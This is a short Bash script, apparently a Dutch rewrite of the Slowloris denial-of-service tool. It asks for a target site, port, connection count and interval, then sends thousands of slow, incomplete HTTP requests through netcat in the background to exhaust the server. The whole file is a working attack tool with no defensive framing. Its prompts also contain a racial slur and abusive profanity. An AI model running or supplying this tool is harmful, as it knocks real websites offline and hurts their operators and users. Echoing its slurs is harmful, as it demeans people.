#Voor target instellen
echo "Geef de site nigger:"
	read -i $TARGET -e TARGET
echo "Target is set to $TARGET"
#Om de poort in te stellen
echo "Welke port wil je kkr sukkel?"
echo "anders wordt t 80:"
	read -i $PORT -e PORT
	: ${PORT:=80}
#voor ongeldige poort
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Fout en nu wordt het 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Fout en nu wordt het 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Fout en nu wordt het 80"
	else echo "We gebruiken port $PORT"
	fi
echo "Hoevaak wil je de site neuke?:"
echo "Zeggen anders maken we dr maar 2000 van!"
		read CONNS
	: ${CONNS:=2000}
#voor ongeldig nummer
	if ! [[ "$CONNS" =~ ^[0-9]+$ ]]; then
CONNS=2000 && echo "Is godverdomme ongeldig dus we gaan voor 2000"
	fi
#how long do we wait between sending header lines?
#too long and the connection will likely be closed
#too short and our connections have little/no effect on server
#either too long or too short is bad.  Default random interval is a sane choice
echo "Kies godverdomme hoeveel tijd dr tussen moet zitte!"
echo "Normaal is [r]andom, tussen 5 en 15, of type in seconde kut:"
	read INTERVAL
	: ${INTERVAL:=r}
	if [[ "$INTERVAL" = "r" ]]
then
#if default (random) interval is chosen, generate a random value between 5 and 15
#note that this module uses $RANDOM to generate random numbers, it is sufficient for our needs
INTERVAL=$((RANDOM % 11 + 5))
#check that r (random) or a valid number is entered
	elif ! [[ "$INTERVAL" =~ ^[0-9]+$ ]] && ! [[ "$INTERVAL" = "r" ]]
then
#if not r (random) or valid number is chosen for interval, assume r (random)
INTERVAL=$((RANDOM % 11 + 5)) && echo "FOUT! nu is het een random nummer tussen 5 en 15"
	fi

echo "We gaan de site verkankeren....Ctrl+C om t te stoppen" && sleep 1
	i=1
	while [ "$i" -le "$CONNS" ]; do
echo "Slowloris is zijn ding aan t we zitten op $i, om de $INTERVAL seconds"; 
echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $TARGET $PORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
